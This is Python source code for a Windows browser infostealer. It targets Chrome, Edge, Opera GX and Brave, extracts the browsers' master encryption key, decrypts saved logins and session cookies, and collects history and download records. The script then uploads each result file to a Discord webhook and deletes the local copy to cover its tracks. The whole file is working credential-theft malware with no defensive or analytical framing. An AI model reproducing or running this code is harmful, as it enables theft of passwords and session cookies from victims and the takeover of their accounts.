import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import requests

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

webhook_url = "YOUR_DISCORD_WEBHOOK_URL"  # Replace with your webhook URL

browsers = {
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'edge': appdata + '\\Microsoft\\Edge\\User Data',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)[:-16].decode()
    return decrypted_pass

def save_results_and_send(browser_name, type_of_data, content):
    file_path = f'{browser_name}_{type_of_data}.txt'
    if content:
        with open(file_path, 'w', encoding="utf-8") as f:
            f.write(content)
        send_to_webhook(file_path, browser_name, type_of_data)
        os.remove(file_path)  # Remove the file after sending
        print(f"\t [*] Saved, sent, and deleted: {file_path}")
    else:
        print(f"\t [-] No Data Found for {type_of_data}")

def send_to_webhook(file_path, browser_name, data_type):
    with open(file_path, 'rb') as f:
        response = requests.post(webhook_url, files={"file": (f"{browser_name}_{data_type}.txt", f)},
                                 data={"content": f"Extracted {data_type} from {browser_name}"})
        if response.status_code == 200:
            print(f"\t [*] Successfully sent {file_path} to webhook.")
        else:
            print(f"\t [!] Failed to send {file_path} to webhook.")

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])
        for row in cursor.fetchall():
            row = list(row)
            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes) and row[i]:
                        row[i] = decrypt_password(row[i], key)
            if 'last_visit_time' in type_of_data['columns']:
                row[-1] = convert_chrome_time(row[-1])
            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
        conn.close()
    except sqlite3.OperationalError as e:
        print(f"\t [!] SQLite error: {e}")
    except Exception as e:
        print(f"\t [!] Error extracting {type_of_data}: {e}")
    finally:
        try:
            if os.path.exists('temp_db'):
                os.remove('temp_db')
        except PermissionError:
            print("\t [!] Temp file is in use, skipping deletion.")
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    return [name for name, path in browsers.items() if os.path.exists(path + "\\Local State")]

if __name__ == '__main__':
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting stored details from {browser}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Extracting {data_type_name.replace('_', ' ').capitalize()}")
            profile = "Default" if browser != 'opera-gx' else ""
            data = get_data(browser_path, profile, master_key, data_type)
            save_results_and_send(browser, data_type_name, data)
            print("\t------\n")
